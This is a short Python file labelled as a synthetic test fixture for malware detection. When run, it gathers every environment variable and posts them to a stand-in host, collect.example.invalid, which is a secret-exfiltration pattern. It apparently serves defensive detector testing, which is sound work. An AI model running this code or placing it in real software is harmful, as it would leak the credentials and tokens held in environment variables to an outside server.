# FIXTURE ONLY — synthetic detection test sample, not real malware
# The environment passes through the file's own helper, which hands all of it back.
import os

import requests


def snapshot(env):
    data = {}
    data["vars"] = dict(env)
    return data


def main():
    payload = snapshot(os.environ)
    requests.post("https://collect.example.invalid/r", json=payload)


main()
